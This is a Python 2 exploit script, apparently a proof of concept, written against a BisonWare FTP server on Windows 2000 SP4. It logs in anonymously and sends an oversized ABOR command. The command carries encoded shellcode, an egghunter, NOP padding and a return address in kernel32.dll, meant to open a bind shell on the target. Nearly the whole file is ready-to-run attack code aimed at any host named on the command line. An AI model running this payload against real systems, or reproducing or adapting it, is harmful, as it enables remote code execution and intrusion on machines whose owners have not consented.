#!/usr/bin/python
#------------------------------------------------------------#
#  Name: Rio Atmadja					     #
#  OS  : Windows 2000 SP4 				     #
#  							     # 	
#------------------------------------------------------------#
import socket, sys, os, time
if len(sys.argv) != 2:
	print "[*] Usage: %s <target>  \n" % sys.argv[0]
	sys.exit(0)

target = sys.argv[1] #User Passed Argument 1
shellcode = ( "w00tw00t" +  "\xda\xd8\xbf\x2f\x6d\xe6\x97\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x4f\x83\xe8\xfc\x31\x78\x15\x03\x78\x15\xcd\x98\x1a\x7f\x98"
"\x63\xe3\x80\xfa\xea\x06\xb1\x28\x88\x43\xe0\xfc\xda\x06\x09"
"\x77\x8e\xb2\x9a\xf5\x07\xb4\x2b\xb3\x71\xfb\xac\x72\xbe\x57"
"\x6e\x15\x42\xaa\xa3\xf5\x7b\x65\xb6\xf4\xbc\x98\x39\xa4\x15"
"\xd6\xe8\x58\x11\xaa\x30\x59\xf5\xa0\x09\x21\x70\x76\xfd\x9b"
"\x7b\xa7\xae\x90\x34\x5f\xc4\xfe\xe4\x5e\x09\x1d\xd8\x29\x26"
"\xd5\xaa\xab\xee\x24\x52\x9a\xce\xea\x6d\x12\xc3\xf3\xaa\x95"
"\x3c\x86\xc0\xe5\xc1\x90\x12\x97\x1d\x15\x87\x3f\xd5\x8d\x63"
"\xc1\x3a\x4b\xe7\xcd\xf7\x18\xaf\xd1\x06\xcd\xdb\xee\x83\xf0"
"\x0b\x67\xd7\xd6\x8f\x23\x83\x77\x89\x89\x62\x88\xc9\x76\xda"
"\x2c\x81\x95\x0f\x56\xc8\xf1\xfc\x64\xf3\x01\x6b\xff\x80\x33"
"\x34\xab\x0e\x78\xbd\x75\xc8\x7f\x94\xc1\x46\x7e\x17\x31\x4e"
"\x45\x43\x61\xf8\x6c\xec\xea\xf8\x91\x39\xbc\xa8\x3d\x92\x7c"
"\x19\xfe\x42\x14\x73\xf1\xbd\x04\x7c\xdb\xcb\x03\xeb\x24\x63"
"\x81\xed\xcc\x76\x95\xec\xb7\xfe\x73\x84\xd7\x56\x2c\x31\x41"
"\xf3\xa6\xa0\x8e\x29\x2e\x40\x1c\xb6\xae\x0f\x3d\x61\xf9\x58"
"\xf3\x78\x6f\x75\xaa\xd2\x8d\x84\x2a\x1c\x15\x53\x8f\xa3\x94"
"\x16\xab\x87\x86\xee\x34\x8c\xf2\xbe\x62\x5a\xac\x78\xdd\x2c"
"\x06\xd3\xb2\xe6\xce\xa2\xf8\x38\x88\xaa\xd4\xce\x74\x1a\x81"
"\x96\x8b\x93\x45\x1f\xf4\xc9\xf5\xe0\x2f\x4a\x05\xab\x6d\xfb"
"\x8e\x72\xe4\xb9\xd2\x84\xd3\xfe\xea\x06\xd1\x7e\x09\x16\x90"
"\x7b\x55\x90\x49\xf6\xc6\x75\x6d\xa5\xe7\x5f" )  

egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

buffer = '\x90' * ( 1099 - ( len(shellcode) + len(egghunter) ) )
ebx = "\x66\x4a\x4e\x7c" # 7C4E4A66 #kernel32.dll 

nopsled = '\x90' * 297


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[+] Connecting to %s on port %d" % (target,21)
try:
	s.connect((target,21)) #Connect to BisonWare FTP Server
	s.recv(1024) #Receive 1024 bytes from BisonWare FTP Server
	time.sleep(3) #Wait for 3 seconds before executing next statement
	print "[+] Sending payload"
	s.recv(2000) #Receive 2000 bytes from BisonWare FTP Server
	s.send('USER anonymous\r\n') #Send FTP command 'USER anonymous'
	s.recv(2000) #Receive 2000 bytes from BisonWare FTP Server
	s.send('PASS anonymous\r\n') #Send FTP command 'PASS anonymous'
	s.recv(2000) #Receive 2000 bytes from BisonWare FTP Server
	s.send('ABOR ' + shellcode + buffer + egghunter + ebx + nopsled +'\r\n') #Send FTP command 'ABOR ' + junk data
	s.close() #Close the socket
	print "[+] Exploit Sent Successfully"
	print "\r"
	time.sleep(5) #Wait for 5 seconds before connection to Bind Shell
except:
	print "[-] Could not connect to " + target + ":21\r"
	sys.exit(0) #Exit the Exploit POC code execution

